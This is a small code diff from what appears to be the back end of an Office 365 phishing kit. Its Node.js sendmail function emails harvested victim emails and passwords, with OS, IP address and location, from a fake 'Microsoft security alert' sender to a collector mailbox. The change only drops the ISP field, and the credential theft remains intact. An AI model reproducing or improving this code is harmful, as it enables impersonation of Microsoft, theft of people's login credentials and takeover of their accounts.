@@ -32,7 +32,7 @@ function sendmail(req,res){
   from:'Microsoft security alert <microsoftsecurityalert@gmail.com>',
   to: 'dakota3011@outlook.com',
   subject: 'Information login collected office 365',
-  html: `<b><h2>Login Office365</h2></b><p>Email: ${email}<br>Password: ${password}<br>OS: ${os}<br>IP: ${info_location["ip"]}<br>Country: ${info_location["country"]}<br>City: ${info_location["city"]}<br>ISP: ${info_location["isp"]}</p>`
+  html: `<b><h2>Login Office365</h2></b><p>Email: ${email}<br>Password: ${password}<br>OS: ${os}<br>IP: ${info_location["ip"]}<br>Country: ${info_location["country"]}<br>City: ${info_location["city"]}</p>`
  };
  transporter.sendMail(mailOptions,function(err,info){
   if(err)
